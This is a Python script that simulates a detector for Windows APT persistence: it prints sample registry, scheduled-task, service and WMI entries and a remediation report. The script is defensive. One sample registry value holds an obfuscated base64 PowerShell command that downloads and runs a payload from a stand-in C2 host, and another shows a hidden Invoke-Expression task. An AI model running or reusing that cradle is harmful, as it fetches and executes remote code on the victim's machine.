#!/usr/bin/env python3
"""
Persistence Mechanism Detector
Simulates detecting APT persistence techniques.
"""

import random


class PersistenceDetector:
    """Detects various persistence mechanisms."""

    def __init__(self):
        self.findings = []

    def check_registry_run_keys(self):
        """Check for suspicious registry run keys."""
        print("\n" + "=" * 60)
        print("CHECKING: Registry Run Keys")
        print("=" * 60)

        # Simulated registry entries
        entries = [
            {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "SecurityHealthSystray", "data": "SecurityHealthSystray.exe", "suspicious": False},
            {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "SystemUpdate", "data": "C:\\Users\\Admin\\AppData\\Local\\Temp\\update.exe", "suspicious": True},
            {"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "Chrome", "data": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "suspicious": False},
            {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "value": "AdobeUpdater", "data": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAHAAcgBvAC8AcABhAHkAbABvAGEAZAAnACkA", "suspicious": True},
        ]

        for entry in entries:
            status = "[!] SUSPICIOUS" if entry["suspicious"] else "[OK]"
            print(f"\n{status}")
            print(f"  Key:   {entry['key']}")
            print(f"  Name:  {entry['value']}")
            print(f"  Data:  {entry['data'][:60]}...")

            if entry["suspicious"]:
                self.findings.append({
                    "type": "Registry Persistence",
                    "severity": "HIGH",
                    "location": entry["key"],
                    "details": entry["value"],
                })

    def check_scheduled_tasks(self):
        """Check for suspicious scheduled tasks."""
        print("\n" + "=" * 60)
        print("CHECKING: Scheduled Tasks")
        print("=" * 60)

        tasks = [
            {"name": "Microsoft\\Windows\\Defrag\\ScheduledDefrag", "command": "defrag.exe", "suspicious": False},
            {"name": "SystemMaintenance", "command": "C:\\Windows\\Temp\\maint.exe", "suspicious": True},
            {"name": "GoogleUpdateTaskMachineUA", "command": "GoogleUpdate.exe", "suspicious": False},
            {"name": "OfficeUpdate", "command": "powershell -WindowStyle Hidden -Command Invoke-Expression ...", "suspicious": True},
        ]

        for task in tasks:
            status = "[!] SUSPICIOUS" if task["suspicious"] else "[OK]"
            print(f"\n{status}")
            print(f"  Task:    {task['name']}")
            print(f"  Command: {task['command'][:60]}...")

            if task["suspicious"]:
                self.findings.append({
                    "type": "Scheduled Task Persistence",
                    "severity": "HIGH",
                    "location": task["name"],
                    "details": task["command"],
                })

    def check_services(self):
        """Check for suspicious Windows services."""
        print("\n" + "=" * 60)
        print("CHECKING: Windows Services")
        print("=" * 60)

        services = [
            {"name": "Windows Defender", "display": "Windows Defender Antivirus Service", "path": "C:\\Program Files\\Windows Defender\\MsMpEng.exe", "suspicious": False},
            {"name": "SysMonitor", "display": "System Monitor Service", "path": "C:\\Users\\Public\\sysmon.exe", "suspicious": True},
            {"name": "Spooler", "display": "Print Spooler", "path": "C:\\Windows\\System32\\spoolsv.exe", "suspicious": False},
        ]

        for svc in services:
            status = "[!] SUSPICIOUS" if svc["suspicious"] else "[OK]"
            print(f"\n{status}")
            print(f"  Service: {svc['name']}")
            print(f"  Display: {svc['display']}")
            print(f"  Path:    {svc['path']}")

            if svc["suspicious"]:
                self.findings.append({
                    "type": "Service Persistence",
                    "severity": "HIGH",
                    "location": svc["name"],
                    "details": svc["path"],
                })

    def check_wmi_subscriptions(self):
        """Check for WMI event subscription persistence."""
        print("\n" + "=" * 60)
        print("CHECKING: WMI Event Subscriptions")
        print("=" * 60)

        subscriptions = [
            {"name": "BVTConsumer", "query": "SELECT * FROM __InstanceModificationEvent", "action": "Launch Calculator (legitimate test)", "suspicious": False},
            {"name": "SystemUpdate", "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60", "action": "Execute encoded PowerShell command", "suspicious": True},
        ]

        for sub in subscriptions:
            status = "[!] SUSPICIOUS" if sub["suspicious"] else "[OK]"
            print(f"\n{status}")
            print(f"  Name:   {sub['name']}")
            print(f"  Query:  {sub['query']}")
            print(f"  Action: {sub['action']}")

            if sub["suspicious"]:
                self.findings.append({
                    "type": "WMI Persistence",
                    "severity": "CRITICAL",
                    "location": sub["name"],
                    "details": sub["action"],
                })

    def generate_report(self):
        """Generate detection report."""
        print(f"\n{'=' * 60}")
        print("PERSISTENCE DETECTION REPORT")
        print(f"{'=' * 60}")

        if not self.findings:
            print("\nNo persistence mechanisms detected.")
            return

        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for finding in self.findings:
            severity_counts[finding["severity"]] += 1

        print(f"\nTotal Findings: {len(self.findings)}")
        for sev, count in severity_counts.items():
            if count > 0:
                print(f"  {sev}: {count}")

        print(f"\n{'─' * 60}")
        print("DETECTED PERSISTENCE MECHANISMS")
        print(f"{'─' * 60}")
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['type']}")
            print(f"  Location: {finding['location']}")
            print(f"  Details:  {finding['details']}")

        print(f"\n{'─' * 60}")
        print("REMEDIATION STEPS")
        print(f"{'─' * 60}")
        print("1. Remove suspicious registry entries")
        print("2. Delete unauthorized scheduled tasks")
        print("3. Stop and remove malicious services")
        print("4. Remove WMI event subscriptions")
        print("5. Scan for related malware")
        print("6. Reset compromised accounts")


def main():
    print("=" * 60)
    print("PERSISTENCE MECHANISM DETECTOR")
    print("=" * 60)
    print("Detect common APT persistence techniques.\n")

    detector = PersistenceDetector()

    input("Press Enter to begin scan...")

    detector.check_registry_run_keys()
    detector.check_scheduled_tasks()
    detector.check_services()
    detector.check_wmi_subscriptions()
    detector.generate_report()

    print("\n" + "=" * 60)
    print("Regular persistence scanning is essential for APT detection")
    print("=" * 60)


if __name__ == "__main__":
    main()
